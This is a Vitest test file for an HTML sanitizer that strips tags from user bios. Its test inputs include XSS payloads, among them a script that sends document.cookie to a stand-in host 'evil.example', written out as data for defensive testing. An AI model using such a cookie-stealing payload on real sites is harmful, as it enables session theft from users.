import { describe, it, expect } from "vitest";
import { stripHtml, sanitizeOrFallback } from "./sanitize";

describe("sanitize", () => {
  it("plain text unchanged", () => {
    expect(stripHtml("Experienced Spanish teacher, 5 years")).toBe("Experienced Spanish teacher, 5 years");
  });

  it("null/undefined/empty string", () => {
    expect(stripHtml(null)).toBe("");
    expect(stripHtml(undefined)).toBe("");
    expect(stripHtml("")).toBe("");
  });

  it("script tag and img onerror payloads stripped", () => {
    expect(stripHtml("<img src=x onerror=\"alert('xss')\">")).toBe("");
    expect(stripHtml("<script>alert(1)</script>")).toBe("alert(1)");
  });

  it("payload embedded mid-bio", () => {
    expect(
      stripHtml("Hi I'm Maria <script>document.location='http://evil.example/steal?c='+document.cookie</script> I teach French")
    ).toBe("Hi I'm Maria document.location='http://evil.example/steal?c='+document.cookie I teach French");
  });

  it("nested malformed tags", () => {
    expect(stripHtml("<<script>alert(1)<</script>>")).toBe("alert(1)");
  });

  it("multiple separate tags", () => {
    expect(stripHtml("<b>Bold</b> and <i>italic</i>")).toBe("Bold and italic");
  });

  it("whitespace trimming", () => {
    expect(stripHtml("   <p>padded</p>   ")).toBe("padded");
  });

  it("sanitizeOrFallback", () => {
    expect(sanitizeOrFallback(null, "Experienced Spanish teacher")).toBe("Experienced Spanish teacher");
    expect(sanitizeOrFallback("<script></script>", "fallback")).toBe("fallback");
    expect(sanitizeOrFallback("<b>Real bio</b>", "fallback")).toBe("Real bio");
  });
});
